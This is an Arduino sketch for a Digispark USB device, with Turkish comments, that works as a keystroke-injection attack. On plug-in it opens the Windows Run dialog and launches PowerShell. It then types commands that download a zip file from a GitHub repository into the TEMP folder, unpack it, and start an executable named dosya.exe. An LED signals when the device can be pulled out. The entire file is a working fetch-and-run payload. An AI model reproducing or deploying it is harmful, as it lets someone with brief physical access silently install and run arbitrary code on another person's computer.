#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {         //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT);  //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); 
  DigiKeyboard.delay(500); // 500 ms bekleyin
  DigiKeyboard.print("powershell"); // Open powershell
  DigiKeyboard.delay(500); // 500 ms bekleyin
  DigiKeyboard.sendKeyPress(KEY_ENTER); // Press Enter key
  DigiKeyboard.delay(500); // 500 ms bekleyin
  DigiKeyboard.write("[System.IO.File]::WriteAllBytes(\"$env:TEMP/dos.zip\", (Invoke-WebRequest -Uri 'https://github.com/enessakircolak/outofrun/blob/main/dosya.zip?raw=true' -Method Get -UseBasicParsing).content)");  // get file's hex from my another repo and write it to a new file then save it as "dos.zip"
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.write("Expand-Archive -Path \"$env:TEMP/dos.zip\" -DestinationPath $env:TEMP");  // open archive then save it in TEMP folder
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.write("Start-Process \"$env:TEMP/dosya.exe\"");    // RUN to the ligth :))
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}